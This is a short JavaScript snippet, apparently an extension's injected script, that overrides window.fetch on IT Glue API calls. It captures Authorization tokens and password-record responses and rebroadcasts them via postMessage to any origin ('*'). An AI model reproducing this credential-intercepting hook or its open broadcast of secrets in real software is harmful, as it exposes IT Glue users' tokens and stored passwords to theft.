(function () {
  'use strict';

  const _origFetch = window.fetch.bind(window);

  window.fetch = function (input, init) {
    const url = (typeof input === 'string')
      ? input
      : (input && input.url) || '';

    if (!url.includes('itglue.com/api/')) {
      return _origFetch(input, init);
    }

    try {
      const hdrs = (init && init.headers) || (input && input.headers);
      let auth = '';
      if (hdrs instanceof Headers) {
        auth = hdrs.get('authorization') || hdrs.get('Authorization') || '';
      } else if (hdrs && typeof hdrs === 'object') {
        auth = hdrs['authorization'] || hdrs['Authorization'] || '';
      }
      if (auth) {
        window.postMessage({
          __itglueOtp: true,
          type:    'TOKEN',
          token:   auth,
          baseUrl: new URL(url).origin
        }, '*');
      }
    } catch (_) {}

    return _origFetch(input, init).then(response => {
      if (url.includes('/relationships/passwords')) {
        response.clone().json().then(body => {
          if (body && Array.isArray(body.data)) {
            window.postMessage({
              __itglueOtp: true,
              type:      'PASSWORDS',
              passwords: body.data
            }, '*');
          }
        }).catch(() => {});
      }
      return response;
    });
  };
})();
